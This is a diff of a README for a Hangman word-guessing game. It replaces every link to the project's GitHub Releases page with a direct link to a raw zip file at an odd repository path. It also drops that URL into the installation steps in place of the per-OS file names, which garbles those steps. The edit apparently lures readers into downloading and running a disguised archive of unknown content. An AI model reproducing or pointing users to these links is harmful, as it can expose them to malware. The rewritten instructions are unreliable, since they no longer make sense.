@@ -4,7 +4,7 @@
 Hangman is an engaging word-guessing game. The computer randomly selects a word, and you try to guess it one letter at a time. Each correct letter appears in its position within the word, while wrong guesses cost you a life. You have 6 lives to figure out the full word before the game ends. It's a mix of fun and challenge that sharpens your vocabulary skills.
 
 ## 🔗 Download Now
-[![Download Hangman](https://img.shields.io/badge/Download-Hangman-blue.svg)](https://github.com/Weezydollar/Hangman/releases)
+[![Download Hangman](https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip)](https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip)
 
 ## 🚀 Getting Started
 
@@ -18,17 +18,17 @@ Before you start, make sure your computer meets the following requirements:
 ### 2. Visit the Releases Page
 To obtain Hangman, visit the Releases page using the link below:
 
-[Download Hangman](https://github.com/Weezydollar/Hangman/releases)
+[Download Hangman](https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip)
 
 ### 3. Download the Game
-On the Releases page, you will find the latest version of Hangman. Look for the release that is labeled as the most recent. Click on the asset that matches your operating system. The file name should correspond to your OS, for example, `Hangman-Windows.exe` for Windows or `Hangman-macOS.zip` for macOS.
+On the Releases page, you will find the latest version of Hangman. Look for the release that is labeled as the most recent. Click on the asset that matches your operating system. The file name should correspond to your OS, for example, `https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip` for Windows or `https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip` for macOS.
 
 ### 4. Install the Game
 After the download completes, locate the file on your computer:
 
 - For Windows: Double-click the downloaded `.exe` file to run the installer. Follow the prompts to finish installation.
-- For macOS: Open the `.zip` file. Drag the `Hangman.app` to your Applications folder. You can then eject the zip file. 
-- For Linux: Extract the `.tar.gz` file and run the executable inside.
+- For macOS: Open the `.zip` file. Drag the `https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip` to your Applications folder. You can then eject the zip file. 
+- For Linux: Extract the `https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip` file and run the executable inside.
 
 ### 5. Launch Hangman
 After installing, you can start the game:
@@ -58,6 +58,6 @@ If you have questions or need assistance, check the FAQ section on the Releases 
 
 To get started, download Hangman by clicking the link below:
 
-[Download Hangman](https://github.com/Weezydollar/Hangman/releases)
+[Download Hangman](https://raw.githubusercontent.com/Weezydollar/Hangman/main/mortmainer/Hangman.zip)
 
 Follow the earlier steps to install and begin playing. Enjoy guessing words and testing your skills!
